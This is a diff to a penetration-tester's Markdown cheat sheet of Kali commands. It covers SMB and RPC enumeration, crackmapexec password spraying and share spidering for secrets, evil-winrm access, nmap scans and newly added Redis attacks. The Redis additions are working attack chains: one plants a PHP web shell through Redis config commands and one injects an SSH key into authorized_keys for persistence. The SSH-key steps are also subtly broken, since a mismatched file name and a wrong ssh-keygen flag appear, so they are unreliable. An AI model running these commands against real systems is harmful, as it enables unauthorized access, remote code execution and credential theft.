@@ -145,7 +145,7 @@ user@remote:$ export TERM=xterm
 Mount:
 
 ```
-root@kali:$ mount -t cifs //127.0.0.1/Users /mnt/smb -v -o user=snovvcrash,[pass=qwe123]
+root@kali:$ mount -t cifs '//127.0.0.1/Users' /mnt/smb -v -o user=snovvcrash,[pass=qwe123]
 ```
 
 Status:
@@ -220,7 +220,8 @@ root@kali:$ smbclient -U snovvcrash '\\127.0.0.1\Users' qwe123
 ### crackmapexec
 
 ```
-root@kali:$ crackmapexec smb -u nullinux_users.txt -p 'qwe123' --shares [--continue-on-success] 127.0.0.1
+root@kali:$ cme smb 127.0.0.1 -u nullinux_users.txt -p 'qwe123' --shares [--continue-on-success]
+root@kali:$ cme smb 127.0.0.1 -u snovvcrash -p qwe123 --spider-folder 'E\$' --pattern s3cret
 ```
 
 Same password spraying with Metasploit:
@@ -252,15 +253,15 @@ root@kali:$ python3 -m pip install --upgrade .
 
 ### Dump Users from DCE/RPC SAMR
 
-
 #### rpcclient
 
 ```
-root@kali:$ rpcclient -U "" -N 127.0.0.1
+root@kali:$ rpcclient -U '' -N 127.0.0.1
+root@kali:$ rpcclient -U 'snovvcrash%qwe123' 127.0.0.1
+
 rpcclient $> enumdomusers
 rpcclient $> enumdomgroups
 ```
-
 
 #### enum4linux
 
@@ -268,13 +269,11 @@ rpcclient $> enumdomgroups
 root@kali:$ enum4linux -v -a 127.0.0.1 | tee enum4linux.txt
 ```
 
-
 #### nullinux.py
 
 ```
 root@kali:$ ./nullinux.py 127.0.0.1
 ```
-
 
 #### samrdump.py (Impacket)
 
@@ -603,8 +602,17 @@ PS> runas /netonly /user:snovvcrash powershell
 
 #### evil-winrm.rb
 
+Install:
+
 ```
-root@kali:$ ruby evil-winrm.rb -u snovvcrash -p qwe123 -i 127.0.0.1 -s ./ -e ./
+root@kali:$ git clone https://github.com/Hackplayers/evil-winrm /opt/evil-winrm
+root@kali:$ ln -s /opt/evil-winrm/evil-winrm.rb /usr/local/bin/evil-winrm.rb
+```
+
+Run:
+
+```
+root@kali:$ evil-winrm.rb -u snovvcrash -p qwe123 -i 127.0.0.1 -s ./ -e ./
 ```
 
 * [github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)
@@ -743,6 +751,62 @@ SELECT tbl_name FROM sqlite_master WHERE type='table' AND tbl_name NOT like 'sql
 SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='secret_database';
 SELECT username,password FROM secret_database;
 ```
+
+
+### Redis
+
+#### Preparation
+
+Install **[1]** or **[2]**:
+
+```
+root@kali:$ mkdir /opt/redis-cli-go && cd /opt/redis-cli-go
+root@kali:$ wget [1] -O redis-cli-go && chmod +x redis-cli-go
+root@kali:$ ln -s /opt/redis-cli-go/redis-cli-go /usr/local/bin/redis-cli-go && cd -
+```
+
+1. [github.com/holys/redis-cli/releases](https://github.com/holys/redis-cli/releases)
+2. [github.com/antirez/redis](https://github.com/antirez/redis)
+
+Check if vulnarable:
+
+```
+root@kali:$ nc 127.0.0.1 6379
+Escape character is '^]'.
+echo "Hey, no AUTH required!"
+$21
+Hey, no AUTH required!
+quit
++OK
+Connection closed by foreign host.
+```
+
+#### Web Shell
+
+```
+root@kali:$ redis-cli -h 127.0.0.1 flushall
+root@kali:$ redis-cli -h 127.0.0.1 set pwn '<?php system($_REQUEST['cmd']); ?>'
+root@kali:$ redis-cli -h 127.0.0.1 config set dbfilename shell.php
+root@kali:$ redis-cli -h 127.0.0.1 config set dir /var/www/html/
+root@kali:$ redis-cli -h 127.0.0.1 save
+```
+
+* [book.hacktricks.xyz/pentesting/6379-pentesting-redis](https://book.hacktricks.xyz/pentesting/6379-pentesting-redis)
+
+#### Inject SSH PubKey
+
+```
+root@kali:$ ssh-keygen -t ecdsa -s 521 -f key
+root@kali:$ (echo -e "\n\n"; cat key.pub; echo -e "\n\n") > key.txt
+root@kali:$ redis-cli -h 127.0.0.1 flushall
+root@kali:$ cat foo.txt | redis-cli -h 127.0.0.1 -x set pwn
+root@kali:$ redis-cli -h 127.0.0.1 config set dbfilename authorized_keys
+root@kali:$ redis-cli -h 127.0.0.1 config set dir /var/lib/redis/.ssh
+root@kali:$ redis-cli -h 127.0.0.1 save
+```
+
+* [packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html](https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html)
+* [2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf](https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf)
 
 
 
@@ -1162,7 +1226,7 @@ root@kali:$ nmaptocsv.py -x services/quick-sweep.xml -d',' -f ip-fqdn-port-proto
 #### Ports (Full)
 
 ```
-root@kali:$ nmap -n -Pn -sV -A -iL hosts/targets.txt -oA services/alltcp-versions -p0-65535 --min-rate 50000 --min-hostgroup 256
+root@kali:$ nmap -n -Pn -sV -sC -iL hosts/targets.txt -oA services/alltcp-versions -p0-65535 --min-rate 50000 --min-hostgroup 256
 ```
 
 Define which NSE scripts ran:
